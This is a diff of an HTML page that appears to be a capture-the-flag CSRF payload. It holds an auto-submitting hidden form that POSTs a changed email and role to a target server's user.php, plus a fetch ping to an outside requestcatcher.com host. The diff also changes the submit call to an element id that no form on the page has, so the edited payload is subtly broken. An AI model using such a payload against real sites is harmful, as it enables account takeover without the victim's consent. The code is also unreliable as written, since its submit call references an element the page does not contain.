@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="f" method="POST" action="http://51.44.165.35:49159/user.php">
+    <form id="f" method="POST" action="http://51.44.165.35:49160/user.php">
         <input type="hidden" name="id" value="19483756"/>
         <input type="hidden" name="lastname" value="Test"/>
         <input type="hidden" name="firstname" value="Test"/>
         <input type="hidden" name="email" value="admin@ctf.fr"/>
         <input type="hidden" name="role" value="invite"/>
     </form>
-
     <script>
         // Ping de confirmation
         fetch("https://pachour.requestcatcher.com/test", {
@@ -16,7 +15,7 @@
         });
 
         // Envoi du CSRF
-        document.getElementById("f").submit();
+        document.getElementById("csrf").submit();
     </script>
 </body>
 </html>
